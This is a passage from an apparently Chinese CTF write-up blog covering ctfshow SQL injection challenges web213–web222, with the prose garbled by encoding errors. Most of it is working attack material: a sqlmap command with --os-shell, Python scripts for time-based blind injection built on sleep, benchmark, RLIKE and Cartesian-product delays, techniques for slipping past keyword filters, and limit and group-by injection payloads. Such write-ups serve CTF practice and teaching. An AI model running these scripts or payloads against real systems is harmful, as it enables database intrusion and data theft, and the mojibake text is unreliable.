å‚æ•°æ¥æ§åˆ¶å¯¼å…¥å¯¼å‡ºæƒé™ï¼Œè¯¥å‚æ•°åé¢ä¸ºnullæ—¶ï¼Œåˆ™è¡¨ç¤ºä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼›å¦‚æœæ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ™è¡¨ç¤ºä»…èƒ½åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­å¯¼å…¥å¯¼å‡ºï¼›å¦‚æœå‚æ•°åé¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å€¼æ—¶ï¼Œåˆ™è¡¨ç¤ºåœ¨ä»»ä½•æ–‡ä»¶å¤¹éƒ½èƒ½å¯¼å…¥å¯¼å‡º</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 0,1;&quot;;      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;</code></pre><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">python sqlmap.py -u &quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer&#x3D;&quot;ctf.show&quot; --dump --batch --no-cast --cookie&#x3D;&quot;PHPSESSID&#x3D;b5cvb96c8fol1ev4rbbkp6p88d&quot; --method&#x3D;&quot;PUT&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;074b704a-f2a2-4352-bede-0ac63d9324ce.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshowweb213 --os-shell</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510225713255.png" alt="image-20220510225713255"></p><h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>æ—¶é—´ç›²æ³¨ï¼Œè·‘è„šæœ¬å°±è¡Œäº†</p><p>æ‡’å¾—å†™äº†ï¼ŒæŠ„ä¸€ä¸‹ä½œä¸š</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show&#x2F;api&#x2F;&quot;result &#x3D; &quot;&quot;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # æŸ¥æ•°æ®åº“        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # æŸ¥åˆ—åå­—-id.flag        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;&quot;        # æŸ¥æ•°æ®        payload &#x3D; &quot;select flaga from ctfshow_flagx&quot;        data &#x3D; &#123;            &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)            tail &#x3D; mid        except Exception as e:            head &#x3D; mid + 1    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>ç”¨äº†å•å¼•å·ï¼Œä¹Ÿå°±æ˜¯å˜æˆå­—ç¬¦å‹æ³¨å…¥äº†ï¼Œè®°å¾—é—­åˆå°±è¡Œ</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show&#x2F;api&#x2F;&quot;result &#x3D; &quot;&quot;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # æŸ¥æ•°æ®åº“        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # æŸ¥åˆ—åå­—-id.flag        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxc&#39;&quot;        # æŸ¥æ•°æ®        payload &#x3D; &quot;select flagaa from ctfshow_flagxc&quot;        data &#x3D; &#123;            &#39;ip&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1) and &#39;1&#39;&#x3D;&#39;1&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)            tail &#x3D; mid        except Exception as e:            head &#x3D; mid + 1    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><pre class="language-none"><code class="language-none">where id &#x3D; from_base64($id);</code></pre><p>æŸ¥è¯¢è¯­å¥å˜æˆäº†è¿™æ ·</p><p>è¿™é¢˜ä¸èƒ½å°†base64ç¼–ç ä¹‹åçš„å­—ç¬¦ä¸²ä½œä¸ºpayloadä¼ å…¥ï¼Œå› ä¸ºbase64è§£ç ä¹‹åï¼ŒSQLä¼šå½“åšä¸€ä¸ªå­—ç¬¦ä¸²è€Œä¸æ˜¯ä¸€ä¸ªè¯­å¥</p><p>å°è¯•é—­åˆè¿™ä¸ªbase64è§£ç </p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show&#x2F;api&#x2F;&quot;result &#x3D; &quot;&quot;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # æŸ¥æ•°æ®åº“        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # æŸ¥åˆ—åå­—-id.flag        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcc&#39;&quot;        # æŸ¥æ•°æ®        payload &#x3D; &quot;select flagaac from ctfshow_flagxcc&quot;        data &#x3D; &#123;            &#39;ip&#39;: f&quot;&#39;MQ&#x3D;&#x3D;&#39;) or if (ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)            tail &#x3D; mid        except Exception as e:            head &#x3D; mid + 1    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">where id &#x3D; ($id);      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å±è”½å±é™©åˆ†å­function waf($str)&#123;    return preg_match(&#39;&#x2F;sleep&#x2F;i&#39;,$str);&#125;   </code></pre><p>è¿‡æ»¤äº†sleepï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªbenchmarkå‡½æ•°</p><p>MySQLæœ‰ä¸€ä¸ªå†…ç½®çš„BENCHMARK()å‡½æ•°ï¼Œå¯ä»¥æµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ã€‚å‚æ•°å¯ä»¥æ˜¯éœ€è¦æ‰§è¡Œçš„æ¬¡æ•°å’Œè¡¨è¾¾å¼ã€‚è¡¨è¾¾å¼å¯ä»¥æ˜¯ä»»ä½•çš„æ ‡é‡è¡¨è¾¾å¼ï¼Œæ¯”å¦‚è¿”å›å€¼æ˜¯æ ‡é‡çš„å­æŸ¥è¯¢æˆ–è€…å‡½æ•°ã€‚è¯¥å‡½æ•°å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ€§èƒ½<br>å¥—ç¥çš„æµ‹è¯•ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220510231229494.png" alt="image-20220510231229494"></p><p>ä½†æ˜¯è¿™ä¸ªè¯¯å·®ä¼šå¾ˆå¤§</p><p>è¿è¡Œä¸€æ¬¡md5çš„æ—¶é—´å¯å¤ªçŸ­äº†ï¼Œä½†æ˜¯benchmarkå°±æ˜¯è¿è¡Œ114514 1145140æ¬¡md5è®¡ç®—å‡ºæ¥çš„æ—¶é—´</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ—¶é—´æ˜¯æŒ‡å®¢æˆ·ç«¯çš„ç»è¿‡æ—¶é—´ï¼Œä¸æ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„CPUæ—¶é—´ã€‚</p><p>å› æ­¤è¿™ä¸ªåœ¨æ³¨å…¥çš„æ—¶å€™ï¼Œå’ŒæœåŠ¡å™¨è·Ÿç½‘é€Ÿæœ‰å…³</p><p>å¯ä»¥å€Ÿé‰´äº†fengå¸ˆå‚…çš„æ€è·¯,ä½¿ç”¨äº†time.sleepå‡½æ•°ä½¿æ¯è¯·æ±‚ä¸€æ¬¡å»¶è¿Ÿ0.2ç§’ï¼Œæé«˜å‡†ç¡®ç‡ï¼Œä¸”æ¯çˆ†å‡ºä¸€ä¸ªå­—æ¯åå°±å†å»¶è¿Ÿ1.2ç§’ï¼Œä»¥å…æœåŠ¡å™¨å¡é¡¿ï¼Œè¿™æ ·æ¯æ¡è¯·æ±‚ä¹‹é—´é—´éš”ä¸€å®šçš„æ—¶é—´ï¼Œè™½ç„¶çˆ†èµ·æ¥æ¯”è¾ƒæ…¢ï¼Œä½†æ˜¯å‡†ç¡®ç‡å¯ä»¥è¯´æ˜¯100%ï¼Œä¸è‡³äºå—åˆ°æœåŠ¡å™¨å’Œç½‘é€Ÿçš„å½±å“ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">#@Authï¼šSentimentimport requestsimport timeurl&#x3D;&quot;http:&#x2F;&#x2F;f563ebb3-cced-467b-b970-59f54fb5c9a0.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;flag&#x3D;&#39;&#39;for i in range(50):    m&#x3D;32    n&#x3D;127    while 1:        mid&#x3D;(m+n)&#x2F;&#x2F;2        data&#x3D;&#123;        #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow_flagxccb,ctfshow_info        #&#39;ip&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxccb&#39;),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #id,flagaabc,info        &#39;ip&#39;:&quot;if(ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))&lt;&#123;&#125;,benchmark(1000000,md5(1)),0)&quot;.format(i,mid),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;d0ec2f99-1463-480a-b2d0-f5bb3d464411&#125;        &#125;        #print(data)        try:           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.5)           m&#x3D;mid        except:            n&#x3D;mid        if(m+1&#x3D;&#x3D;n):            flag+&#x3D;chr(m)            print(flag)            break        time.sleep(0.2)    time.sleep(1)</code></pre><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;    return preg_match(&#39;&#x2F;sleep|benchmark&#x2F;i&#39;,$str);&#125;   </code></pre><p>benchmarkä¹Ÿè¢«è¿‡æ»¤äº†</p><p>å‚è€ƒä¸€ä¸‹è¿™ä¸¤ä¸ª</p><p><a href="https://www.cnblogs.com/forforever/p/13019703.html">https://www.cnblogs.com/forforever/p/13019703.html</a></p><p><a href="https://xz.aliyun.com/t/5505">SQLæ³¨å…¥æœ‰è¶£å§¿åŠ¿æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>1.sleep</p><p>2.benchmark</p><p>3.ç¬›å¡å°”ç§¯</p><p>4.GET_LOCK() åŠ é”</p><p>5.RLIKE REGEXPæ­£åˆ™åŒ¹é…</p><p>ä½¿ç”¨rpadæˆ–è€…repeatæ„é€ é•¿å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼æ§åˆ¶å»¶æ—¶</p><pre class="language-none"><code class="language-none">mysql&gt; select * from ctftable where if((concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),1,1);+----+-------+--------+| id | user  | passwd |+----+-------+--------+|  1 | admin | passwd ||  2 | user  | pass   ||  3 | Lxxx  | 123456 |+----+-------+--------+3 rows in set (3.63 sec)</code></pre><pre class="language-python" data-language="python"><code class="language-python">import timeimport requestsurl &#x3D; &#39;http:&#x2F;&#x2F;3471a536-3547-4d4b-93c6-06020fab5ffe.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;flag &#x3D; &#39;&#39;sleep_rep &#x3D; &quot;concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) rlike &#39;(a.*)+(a.*)+b&#39;&quot;for i in range(60):    lenth &#x3D; len(flag)    min,max &#x3D; 32,128    while True:        j &#x3D; min + (max-min)&#x2F;&#x2F;2        if(min &#x3D;&#x3D; j):            flag +&#x3D; chr(j)            print(flag)            break        payload &#x3D; &#123;&quot;ip&quot;:f&quot;&#39;&#39;) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;i&#125;,1))&lt;&#123;j&#125;,&#123;sleep_rep&#125;,&#39;False&#39;)#&quot;                   ,&#39;debug&#39;:0&#125;        try:            r &#x3D; requests.post(url&#x3D;url,data&#x3D;payload,timeout&#x3D;0.5)            min &#x3D; j        except:            max &#x3D; j        time.sleep(0.2)</code></pre><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><pre><code>//å±è”½å±é™©åˆ†å­function waf($str)&#123;    return preg_match(&#39;/sleep|benchmark|rlike/i&#39;,$str);&#125;   </code></pre><p>rlikeä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå°è¯•ç”¨ç¬›å¡å„¿ç§¯</p><pre class="language-none"><code class="language-none">ç¬›å¡å°”ç§¯(å› ä¸ºè¿æ¥è¡¨æ˜¯ä¸€ä¸ªå¾ˆè€—æ—¶çš„æ“ä½œ)AxB&#x3D;Aå’ŒBä¸­æ¯ä¸ªå…ƒç´ çš„ç»„åˆæ‰€ç»„æˆçš„é›†åˆï¼Œå°±æ˜¯è¿æ¥è¡¨SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;select * from table_name A, table_name Bselect * from table_name A, table_name Bï¼Œtable_name Cselect count(*) from table_name A, table_name Bï¼Œtable_name C  è¡¨å¯ä»¥æ˜¯åŒä¸€å¼ è¡¨</code></pre><p>Lxxxå¸ˆå‚…çš„æµ‹è¯•ï¼š</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B;+----------+| count(*) |+----------+| 62805625 |+----------+1 row in set (1.74 sec)</code></pre><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;f6ad04f0-3fd9-4eb9-9dc9-78cfaa9f5000.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;flag&#x3D;&#39;&#39;for i in range(60):    lenth &#x3D; len(flag)    min,max &#x3D; 32,128    while True:        j &#x3D; min + (max-min)&#x2F;&#x2F;2        if(min &#x3D;&#x3D; j):            flag +&#x3D; chr(j)            print(flag)            break        # payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;        # payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxca&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;        payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;i&#125;,1))&lt;&#123;j&#125;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;        data&#x3D;&#123;            &#39;ip&#39;:payload,            &#39;debug&#39;:0        &#125;        try:            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15)            min&#x3D;j        except:            max&#x3D;j        time.sleep(0.1)</code></pre><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><pre><code>//å±è”½å±é™©åˆ†å­function waf($str)&#123;    return preg_match(&#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#39;,$str);&#125;   </code></pre><p>payloadåŒä¸Š</p><p>æˆ–è€…</p><p>è¿‡æ»¤asciiå’Œsubstrå¯ä»¥ç”¨likeä»£æ›¿,åœ¨æ„é€  payload çš„æ—¶å€™ä½¿ç”¨ limit é™åˆ¶æŸ¥è¯¢æ¡æ•°ï¼Œä»è€Œç»•è¿‡ concat çš„é™åˆ¶,åœ¨ä¸Šé¢˜expåŸºç¡€ä¸Šä¿®æ”¹ä¸€ä¸‹å³å¯</p><pre class="language-python" data-language="python"><code class="language-python">#@Authï¼šSentimentimport requestsimport time as turl&#x3D;&#39;http:&#x2F;&#x2F;b25594e9-ab57-43ce-a255-7b87f771b72a.challenge.ctf.show&#x2F;api&#x2F;index.php&#39;flag&#x3D;&#39;ctfshow&#123;&#39;for i in range(1,50):    for j in &#39;abcdefghijklmnopqrstuvwxyz1234567890-_&#123;&#125;&#39;:        data&#x3D;&#123;        #&#39;ip&#39;:&quot;if((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # ctfshow_flagxcac        #&#39;ip&#39;:&quot;if((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagxcac&#39; limit 1,1) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; # flagaabcc        &#39;ip&#39;:&quot;if((select flagaabcc from ctfshow_flagxcac) like &#39;&#123;&#125;&#39;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)&quot;.format(flag + j + &quot;%&quot;),&#39;debug&#39;:&quot;0&quot; #ctfshow&#123;e97ffaa2-9de8-4b3d-a623-1a09ad9eeb83&#125;        &#125;        print(data)        try:           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.15)        except:            flag+&#x3D;j            print(flag)            break        t.sleep(0.3)</code></pre><h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>ç›²æ³¨ç»ˆäºç»“æŸäº†ï¼Œå°¤å…¶æ˜¯æ—¶é—´ç›²æ³¨ï¼Œæ„Ÿè§‰åˆè´¹æ—¶åˆè´¹åŠ›ã€‚</p><blockquote><p>limitæ³¨å…¥</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; select * from ctfshow_user limit ($page-1)*$limit,$limit;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤&#x2F;&#x2F;æ‹¿åˆ°æ•°æ®åº“åå­—å°±ç®—ä½ èµ¢      </code></pre><p>çœ‹ä¸€ä¸‹è¿™ä¸ªæŸ¥è¯¢è¯­å¥</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from tableName limit i,n# tableNameï¼šè¡¨å# iï¼šä¸ºæŸ¥è¯¢ç»“æœçš„ç´¢å¼•å€¼(é»˜è®¤ä»0å¼€å§‹)ï¼Œå½“i&#x3D;0æ—¶å¯çœç•¥i# nï¼šä¸ºæŸ¥è¯¢ç»“æœè¿”å›çš„æ•°é‡# iä¸nä¹‹é—´ä½¿ç”¨è‹±æ–‡é€—å·&quot;,&quot;éš”å¼€#limit n ç­‰åŒäº limit 0,n</code></pre><p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p><p>pç‰›çš„æ–‡ç« </p><p>é‡Œé¢å†™é“</p><blockquote><p>åœ¨LIMITåé¢å¯ä»¥è·Ÿä¸¤ä¸ªå‡½æ•°ï¼ŒPROCEDURE å’Œ INTOï¼ŒINTOé™¤éæœ‰å†™å…¥shellçš„æƒé™ï¼Œå¦åˆ™æ˜¯æ— æ³•åˆ©ç”¨çš„ï¼Œé‚£ä¹ˆä½¿ç”¨PROCEDUREå‡½æ•°èƒ½å¦æ³¨å…¥å‘¢</p></blockquote><p>é‚£è‚¯å®šæ˜¯èƒ½æ³¨å…¥çš„</p><p>ä¸‹é¢æ˜¯pç‰›çš„å°è¯•è¿‡ç¨‹</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure</code></pre><p>ANALYSEå¯ä»¥æœ‰ä¸¤ä¸ªå‚æ•°ï¼š</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM table where id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1); ERROR 1386 (HY000): Can&#39;t use ORDER clause with this procedure</code></pre><p>çœ‹èµ·æ¥å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œç»§ç»­å°è¯•ï¼š</p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field from table where id &gt; 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);</code></pre><p>ä½†æ˜¯ç«‹å³è¿”å›äº†ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼š </p><pre class="language-none"><code class="language-none">ERROR 1108 (HY000): Incorrect parameters to procedure &#39;analyse&#39;</code></pre><p>sleepå‡½æ•°è‚¯å®šæ²¡æœ‰æ‰§è¡Œï¼Œä½†æ˜¯æœ€ç»ˆæˆ‘è¿˜æ˜¯æ‰¾åˆ°äº†å¯ä»¥æ”»å‡»çš„æ–¹å¼ï¼š </p><pre class="language-none"><code class="language-none">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.41-0ubuntu0.14.04.1&#39;</code></pre><p>å¦‚æœä¸æ”¯æŒæŠ¥é”™æ³¨å…¥çš„è¯ï¼Œè¿˜å¯ä»¥åŸºäºæ—¶é—´æ³¨å…¥ï¼š</p><pre class="language-none"><code class="language-none">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><p>ç›´æ¥ä½¿ç”¨sleepä¸è¡Œï¼Œéœ€è¦ç”¨BENCHMARKä»£æ›¿ã€‚ </p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯åˆ©ç”¨äº†æŠ¥é”™çš„æ–¹å¼æ³¨å‡ºäº†å†…å®¹</p><p>é€‚ç”¨èŒƒå›´ 5.0.0&lt; MySQL &lt;5.6.6</p><p>è€Œè¿™é“é¢˜é‡Œä¹Ÿå¼€å¯äº†æŠ¥é”™</p><p>å½“æ²¡æœ‰idè¿™ä¸€å‚æ•°æ—¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511133031946.png" alt="image-20220511133031946"></p><pre class="language-sql" data-language="sql"><code class="language-sql">1 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))),1)</code></pre><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆå‡ºä¸æ¥æ•°æ®ï¼ˆè™½è¯´åªè¦æ³¨åˆ°åº“åå°±è¡Œ</p><h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><blockquote><p>group æ³¨å…¥</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; select * from ctfshow_user group by $username;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤      </code></pre><p>å‚æ•°åœ¨groupåè¾¹</p><p>group byå¯ç”¨äºæ—¶é—´ç›²æ³¨,ä¸¾ä¸ªä¾‹å­ï¼š</p><pre class="language-none"><code class="language-none">select * from users group by 1,if(1&#x3D;1,sleep(0.5),1);1</code></pre><p>æŸ¥è¯¢æ¯ä¸€è¡Œæ—¶éƒ½éœ€è¦æ‰§è¡Œsleep,æˆ‘æœ‰5è¡Œæ•°æ®æ‰€ä»¥éœ€è¦å¤§çº¦5*0.5ç§’=2.5ç§’å·¦å³çš„æ—¶é—´</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;9f4a1dc4-86c8-4876-b732-f5ffd6be8114.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39;flag&#x3D;&#39;&#39;for i in range(1,100):    min&#x3D;32    max&#x3D;128    while 1:        j&#x3D;min+(max-min)&#x2F;&#x2F;2        if min&#x3D;&#x3D;j:            flag+&#x3D;chr(j)            print(flag)            break        #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;        #payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;        payload&#x3D;f&quot;1,if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)&quot;        try:            r&#x3D;requests.get(url&#x3D;url+payload,timeout&#x3D;0.4)            min&#x3D;j        except:            max&#x3D;j        time.sleep(0.2)</code></pre><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹group byå¸¸è§„çš„æŠ¥é”™è¯­å¥</p><pre class="language-none"><code class="language-none">select count(*) from users group by concat(database(),floor(rand(0)*2));</code></pre><p>å‘ç°èƒ½æŸ¥å‡ºä¸œè¥¿ï¼Œé‚£æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨å¸ƒå°”ç›²æ³¨</p><pre class="language-python" data-language="python"><code 